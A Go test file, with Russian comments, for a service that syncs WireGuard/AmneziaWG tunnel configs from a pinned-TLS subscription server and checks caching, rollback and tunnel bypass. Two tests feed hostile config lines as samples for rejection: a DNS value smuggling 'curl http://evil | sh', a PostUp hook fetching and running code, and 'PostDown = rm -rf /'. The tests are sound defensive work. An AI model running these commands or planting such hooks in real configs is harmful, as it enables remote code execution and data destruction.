package subsync

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"awg31/internal/store"
	"awg31/internal/tunnel"
)

var key = base64.StdEncoding.EncodeToString(make([]byte, 32))

func confWith(endpoint string) string {
	return "[Interface]\nPrivateKey = " + key + "\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = " + key +
		"\nAllowedIPs = 0.0.0.0/0\nEndpoint = " + endpoint + "\n"
}

// fakeRunner имитирует awg/awg-quick: считает вызовы up/down.
type fakeRunner struct{ ups, downs atomic.Int32 }

func (f *fakeRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	if strings.HasSuffix(name, "awg-quick") {
		if args[0] == "up" {
			f.ups.Add(1)
		} else {
			f.downs.Add(1)
		}
	}
	return nil, nil
}

type env struct {
	svc *Service
	st  *store.Store
	run *fakeRunner
	srv *httptest.Server
	cur atomic.Value // текущий ответ сервера
}

func setup(t *testing.T) *env {
	e := &env{run: &fakeRunner{}}
	e.cur.Store(confWith("192.0.2.1:51820"))
	e.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body := e.cur.Load().(string)
		sum := sha256.Sum256([]byte(body))
		etag := `"` + hex.EncodeToString(sum[:4]) + `"`
		if r.Header.Get("If-None-Match") == etag {
			w.WriteHeader(http.StatusNotModified)
			return
		}
		w.Header().Set("ETag", etag)
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(e.srv.Close)

	var err error
	e.st, err = store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	mgr := tunnel.New(e.run, tunnel.Options{RunDir: t.TempDir()})
	e.svc = &Service{Store: e.st, Tunnels: mgr, AllowLoopback: true}
	sum := sha256.Sum256(e.srv.Certificate().Raw)
	pin := hex.EncodeToString(sum[:])
	_ = e.st.Update(func(s *store.State) error {
		s.Subs["wg0"] = store.Sub{URL: e.srv.URL + "/sub", PinSHA256: pin, IntervalMin: 15}
		return nil
	})
	return e
}

func TestSyncCreatesAndUpdatesProfile(t *testing.T) {
	e := setup(t)
	ctx := context.Background()

	changed, err := e.svc.Sync(ctx, "wg0")
	if err != nil || !changed {
		t.Fatalf("первая синхронизация: changed=%v err=%v", changed, err)
	}
	got, _ := e.st.ReadProfile("wg0")
	if !strings.Contains(got, "192.0.2.1:51820") {
		t.Fatalf("профиль не создан: %q", got)
	}
	if e.st.Snapshot().Subs["wg0"].ETag == "" || e.st.Snapshot().Subs["wg0"].LastSync.IsZero() {
		t.Fatal("ETag и время синхронизации должны сохраняться")
	}

	changed, err = e.svc.Sync(ctx, "wg0")
	if err != nil || changed {
		t.Fatalf("повторная синхронизация без изменений: changed=%v err=%v", changed, err)
	}

	e.cur.Store(confWith("198.51.100.7:443"))
	changed, err = e.svc.Sync(ctx, "wg0")
	if err != nil || !changed {
		t.Fatalf("обновление: changed=%v err=%v", changed, err)
	}
	got, _ = e.st.ReadProfile("wg0")
	if !strings.Contains(got, "198.51.100.7:443") {
		t.Fatal("профиль не обновился")
	}
}

func TestSyncRestartsOnlyRunningTunnel(t *testing.T) {
	e := setup(t)
	ctx := context.Background()
	_, _ = e.svc.Sync(ctx, "wg0")
	e.cur.Store(confWith("198.51.100.7:443"))

	if _, err := e.svc.Sync(ctx, "wg0"); err != nil { // туннель не помечен как поднятый
		t.Fatal(err)
	}
	if e.run.ups.Load() != 0 {
		t.Fatal("выключенный туннель не должен запускаться синхронизацией")
	}

	// помечаем туннель как поднятый и имитируем рабочий конфиг
	if err := e.svc.Tunnels.Up(ctx, "wg0", confWith("198.51.100.7:443")); err != nil {
		t.Fatal(err)
	}
	_ = e.st.Update(func(s *store.State) error { s.Up["wg0"] = true; return nil })
	e.cur.Store(confWith("203.0.113.9:51820"))
	if changed, err := e.svc.Sync(ctx, "wg0"); err != nil || !changed {
		t.Fatalf("changed=%v err=%v", changed, err)
	}
	if e.run.downs.Load() != 1 || e.run.ups.Load() != 2 {
		t.Fatalf("ожидался перезапуск (down=1, up=2), получено down=%d up=%d", e.run.downs.Load(), e.run.ups.Load())
	}
}

func TestSyncRejectsHostileConfigAndKeepsProfile(t *testing.T) {
	e := setup(t)
	ctx := context.Background()
	_, _ = e.svc.Sync(ctx, "wg0")
	before, _ := e.st.ReadProfile("wg0")

	for _, hostile := range []string{
		"Foo = bar",                            // неизвестный ключ
		"SaveConfig = true",                    // awg-quick переписал бы файл
		"DNS = 1.1.1.1; curl http://evil | sh", // метасимволы в значении
	} {
		e.cur.Store(strings.Replace(confWith("192.0.2.1:51820"), "Address = 10.0.0.2/32", "Address = 10.0.0.2/32\n"+hostile, 1))
		if _, err := e.svc.Sync(ctx, "wg0"); err == nil {
			t.Fatalf("конфиг с %q должен отвергаться", hostile)
		}
		after, _ := e.st.ReadProfile("wg0")
		if before != after {
			t.Fatal("профиль не должен меняться после отказа")
		}
		if e.st.Snapshot().Subs["wg0"].LastError == "" {
			t.Fatal("ошибка должна фиксироваться в состоянии подписки")
		}
	}
}

func TestSyncStripsHooksFromPanelConfig(t *testing.T) {
	e := setup(t)
	ctx := context.Background()
	evil := strings.Replace(confWith("192.0.2.1:51820"), "Address = 10.0.0.2/32",
		"Address = 10.0.0.2/32\nTable = 200\nPostUp = curl http://evil | sh\nPostDown = rm -rf /", 1)
	e.cur.Store(evil)
	changed, err := e.svc.Sync(ctx, "wg0")
	if err != nil || !changed {
		t.Fatalf("конфиг панели с хуками должен приниматься после очистки: changed=%v err=%v", changed, err)
	}
	got, _ := e.st.ReadProfile("wg0")
	for _, bad := range []string{"PostUp", "PostDown", "evil", "Table"} {
		if strings.Contains(got, bad) {
			t.Fatalf("в профиле осталось %q:\n%s", bad, got)
		}
	}
	sub := e.st.Snapshot().Subs["wg0"]
	if !strings.Contains(sub.LastNotice, "хуков") || sub.LastError != "" {
		t.Fatalf("замечание про хуки должно сохраняться, а не ошибка: notice=%q err=%q", sub.LastNotice, sub.LastError)
	}
	// повторный запрос: 304, замечание не теряется
	if _, err := e.svc.Sync(ctx, "wg0"); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(e.st.Snapshot().Subs["wg0"].LastNotice, "хуков") {
		t.Fatal("после 304 замечание должно сохраниться")
	}
}

// scriptRunner — управляемая имитация awg/awg-quick для сценариев с откатом.
type scriptRunner struct {
	mu        sync.Mutex
	up        bool
	handshake int64
	failUpIf  string // если в конфиге есть эта подстрока, up завершается ошибкой
	ups       int
	downs     int
	upped     []string
}

func (r *scriptRunner) isUp() bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.up
}

func (r *scriptRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	switch {
	case strings.HasSuffix(name, "awg-quick") && args[0] == "up":
		raw, _ := os.ReadFile(args[1])
		if r.failUpIf != "" && strings.Contains(string(raw), r.failUpIf) {
			return []byte("boom"), errors.New("exit status 1")
		}
		r.up = true
		r.ups++
		r.upped = append(r.upped, string(raw))
	case strings.HasSuffix(name, "awg-quick") && args[0] == "down":
		r.up = false
		r.downs++
	case strings.HasSuffix(name, "awg") && args[0] == "show" && args[1] == "interfaces":
		if r.up {
			return []byte("wg0\n"), nil
		}
	case strings.HasSuffix(name, "awg") && args[0] == "show" && args[2] == "dump":
		return []byte("PRIV\tPUB\t51820\toff\nPEER\t(none)\t192.0.2.1:51820\t0.0.0.0/0\t" +
			strconv.FormatInt(r.handshake, 10) + "\t1\t2\t25\n"), nil
	}
	return nil, nil
}

func scripted(t *testing.T, handler http.HandlerFunc) (*Service, *store.Store, *scriptRunner, *httptest.Server) {
	t.Helper()
	srv := httptest.NewTLSServer(handler)
	t.Cleanup(srv.Close)
	st, err := store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	run := &scriptRunner{}
	svc := &Service{Store: st, Tunnels: tunnel.New(run, tunnel.Options{RunDir: t.TempDir()}), AllowLoopback: true}
	sum := sha256.Sum256(srv.Certificate().RawSubjectPublicKeyInfo)
	pin := "sha256//" + base64.StdEncoding.EncodeToString(sum[:])
	_ = st.Update(func(s *store.State) error {
		s.Subs["wg0"] = store.Sub{URL: srv.URL + "/sub/wg0/tok", PinSHA256: pin, IntervalMin: 5}
		s.Up["wg0"] = true
		return nil
	})
	return svc, st, run, srv
}

func TestSyncRollsBackWhenNewConfigDoesNotComeUp(t *testing.T) {
	oldConf, newConf := confWith("192.0.2.1:51820"), confWith("198.51.100.7:443")
	var serve atomic.Value
	serve.Store(oldConf)
	svc, st, run, _ := scripted(t, func(w http.ResponseWriter, r *http.Request) {
		body := serve.Load().(string)
		w.Header().Set("ETag", `"`+strconv.Itoa(len(body))+`"`)
		_, _ = w.Write([]byte(body))
	})
	ctx := context.Background()
	if _, err := svc.Sync(ctx, "wg0"); err != nil { // первая синхронизация поднимает туннель сама
		t.Fatal(err)
	}
	if !run.isUp() {
		t.Fatal("туннель помечен как поднимаемый: после первой синхронизации он должен работать")
	}
	etagBefore := st.Snapshot().Subs["wg0"].ETag

	run.mu.Lock()
	run.failUpIf = "198.51.100.7"
	run.mu.Unlock()
	serve.Store(newConf)
	_, err := svc.Sync(ctx, "wg0")
	if err == nil || !strings.Contains(err.Error(), "возвращён прежний") {
		t.Fatalf("ожидалась ошибка с откатом, получено %v", err)
	}
	got, _ := st.ReadProfile("wg0")
	if got != oldConf {
		t.Fatalf("профиль должен вернуться к прежнему:\n%s", got)
	}
	if !run.isUp() {
		t.Fatal("после отката туннель должен быть поднят с прежним конфигом")
	}
	if last := run.upped[len(run.upped)-1]; !strings.Contains(last, "192.0.2.1") {
		t.Fatalf("поднят не прежний конфиг:\n%s", last)
	}
	sub := st.Snapshot().Subs["wg0"]
	if sub.ETag != etagBefore || sub.LastError == "" {
		t.Fatalf("ETag не должен продвигаться после неудачи (чтобы повторить попытку): %q -> %q, err=%q", etagBefore, sub.ETag, sub.LastError)
	}
}

func TestSyncBypassesBrokenTunnel(t *testing.T) {
	oldConf, newConf := confWith("192.0.2.1:51820"), confWith("198.51.100.7:443")
	var run *scriptRunner
	svc, st, run, _ := scripted(t, func(w http.ResponseWriter, r *http.Request) {
		if run.isUp() { // через неработающий туннель до панели не достучаться
			hj, _ := w.(http.Hijacker)
			c, _, _ := hj.Hijack()
			_ = c.Close()
			return
		}
		w.Header().Set("ETag", `"new"`)
		_, _ = w.Write([]byte(newConf))
	})
	ctx := context.Background()
	if err := st.WriteProfile("wg0", oldConf); err != nil {
		t.Fatal(err)
	}
	if err := svc.Tunnels.Up(ctx, "wg0", oldConf); err != nil {
		t.Fatal(err)
	}
	run.mu.Lock()
	run.handshake = time.Now().Unix() - 3600 // рукопожатий нет уже час
	run.mu.Unlock()

	changed, err := svc.Sync(ctx, "wg0")
	if err != nil || !changed {
		t.Fatalf("синхронизация в обход туннеля: changed=%v err=%v", changed, err)
	}
	if !run.isUp() || !strings.Contains(run.upped[len(run.upped)-1], "198.51.100.7") {
		t.Fatalf("туннель должен быть поднят уже с новым конфигом: %v", run.upped)
	}
	if run.downs != 1 {
		t.Fatalf("туннель должен опускаться ровно один раз, downs=%d", run.downs)
	}
	got, _ := st.ReadProfile("wg0")
	if got != newConf {
		t.Fatal("профиль не обновился")
	}
}

func TestSyncDoesNotTouchHealthyTunnelOnFetchError(t *testing.T) {
	svc, st, run, _ := scripted(t, func(w http.ResponseWriter, r *http.Request) {
		hj, _ := w.(http.Hijacker)
		c, _, _ := hj.Hijack()
		_ = c.Close()
	})
	ctx := context.Background()
	_ = st.WriteProfile("wg0", confWith("192.0.2.1:51820"))
	_ = svc.Tunnels.Up(ctx, "wg0", confWith("192.0.2.1:51820"))
	run.mu.Lock()
	run.handshake = time.Now().Unix() - 10 // туннель здоров
	run.mu.Unlock()
	if _, err := svc.Sync(ctx, "wg0"); err == nil {
		t.Fatal("ожидалась ошибка запроса")
	}
	if run.downs != 0 || !run.isUp() {
		t.Fatalf("здоровый туннель трогать нельзя: downs=%d up=%v", run.downs, run.isUp())
	}
}

func TestSyncDoesNotBypassOnServerAnswer(t *testing.T) {
	svc, st, run, _ := scripted(t, func(w http.ResponseWriter, r *http.Request) { http.NotFound(w, r) })
	ctx := context.Background()
	_ = st.WriteProfile("wg0", confWith("192.0.2.1:51820"))
	_ = svc.Tunnels.Up(ctx, "wg0", confWith("192.0.2.1:51820"))
	run.mu.Lock()
	run.handshake = 0 // туннель «мёртвый», но сервер ответил 404: туннель работает
	run.mu.Unlock()
	_, err := svc.Sync(ctx, "wg0")
	if err == nil || !strings.Contains(err.Error(), "404") {
		t.Fatalf("ожидалась понятная ошибка про 404, получено %v", err)
	}
	if run.downs != 0 {
		t.Fatal("ответ сервера (даже 404) означает, что сеть работает: туннель опускать нельзя")
	}
	if strings.Contains(st.Snapshot().Subs["wg0"].LastError, "tok") {
		t.Fatal("токен не должен попадать в LastError")
	}
}

func TestSyncUnknownSubscription(t *testing.T) {
	e := setup(t)
	if _, err := e.svc.Sync(context.Background(), "nope"); err == nil {
		t.Fatal("ожидалась ошибка")
	}
	if _, err := e.svc.Sync(context.Background(), "../x"); err == nil {
		t.Fatal("недопустимое имя должно отвергаться")
	}
}

func TestSyncDueRespectsInterval(t *testing.T) {
	e := setup(t)
	now := time.Now()
	e.svc.now = func() time.Time { return now }
	e.svc.syncDue(context.Background()) // LastSync нулевой: пора
	if _, err := e.st.ReadProfile("wg0"); err != nil {
		t.Fatalf("профиль должен быть создан плановой синхронизацией: %v", err)
	}
	e.cur.Store(confWith("198.51.100.7:443"))
	now = now.Add(5 * time.Minute) // интервал 15 минут: рано
	e.svc.syncDue(context.Background())
	got, _ := e.st.ReadProfile("wg0")
	if strings.Contains(got, "198.51.100.7") {
		t.Fatal("синхронизация не должна идти раньше интервала")
	}
	now = now.Add(11 * time.Minute)
	e.svc.syncDue(context.Background())
	got, _ = e.st.ReadProfile("wg0")
	if !strings.Contains(got, "198.51.100.7") {
		t.Fatal("после интервала профиль должен обновиться")
	}
}

// Туннель опущен ради запроса мимо него; если и этот запрос не удался, прежний
// туннель обязан вернуться, иначе зависший-но-рабочий канал пропадёт совсем.
func TestSyncBypassRaisesTunnelBackWhenFetchStillFails(t *testing.T) {
	oldConf := confWith("192.0.2.1:51820")
	svc, st, run, _ := scripted(t, func(w http.ResponseWriter, r *http.Request) {
		hj, _ := w.(http.Hijacker)
		c, _, _ := hj.Hijack()
		_ = c.Close()
	})
	ctx := context.Background()
	_ = st.WriteProfile("wg0", oldConf)
	if err := svc.Tunnels.Up(ctx, "wg0", oldConf); err != nil {
		t.Fatal(err)
	}
	run.mu.Lock()
	run.handshake = time.Now().Unix() - 3600
	run.mu.Unlock()

	if _, err := svc.Sync(ctx, "wg0"); err == nil {
		t.Fatal("ожидалась ошибка запроса")
	}
	run.mu.Lock()
	defer run.mu.Unlock()
	if run.downs != 1 || !run.up {
		t.Fatalf("туннель должен быть опущен один раз и поднят обратно: downs=%d up=%v", run.downs, run.up)
	}
	if last := run.upped[len(run.upped)-1]; last != oldConf && !strings.Contains(last, "192.0.2.1") {
		t.Fatalf("поднят не прежний конфиг:\n%s", last)
	}
}

func TestSyncBypassRaisesTunnelBackOnNotModified(t *testing.T) {
	oldConf := confWith("192.0.2.1:51820")
	var run *scriptRunner
	svc, st, run, _ := scripted(t, func(w http.ResponseWriter, r *http.Request) {
		if run.isUp() { // через зависший туннель до панели не достучаться
			hj, _ := w.(http.Hijacker)
			c, _, _ := hj.Hijack()
			_ = c.Close()
			return
		}
		if r.Header.Get("If-None-Match") == `"v1"` {
			w.WriteHeader(http.StatusNotModified)
			return
		}
		_, _ = w.Write([]byte(oldConf))
	})
	ctx := context.Background()
	_ = st.WriteProfile("wg0", oldConf)
	_ = st.Update(func(s *store.State) error {
		x := s.Subs["wg0"]
		x.ETag = `"v1"`
		s.Subs["wg0"] = x
		return nil
	})
	if err := svc.Tunnels.Up(ctx, "wg0", oldConf); err != nil {
		t.Fatal(err)
	}
	run.mu.Lock()
	run.handshake = time.Now().Unix() - 3600
	run.mu.Unlock()

	changed, err := svc.Sync(ctx, "wg0")
	if err != nil || changed {
		t.Fatalf("304 в обход туннеля: changed=%v err=%v", changed, err)
	}
	run.mu.Lock()
	defer run.mu.Unlock()
	if run.downs != 1 || !run.up {
		t.Fatalf("после 304 туннель должен вернуться: downs=%d up=%v", run.downs, run.up)
	}
}
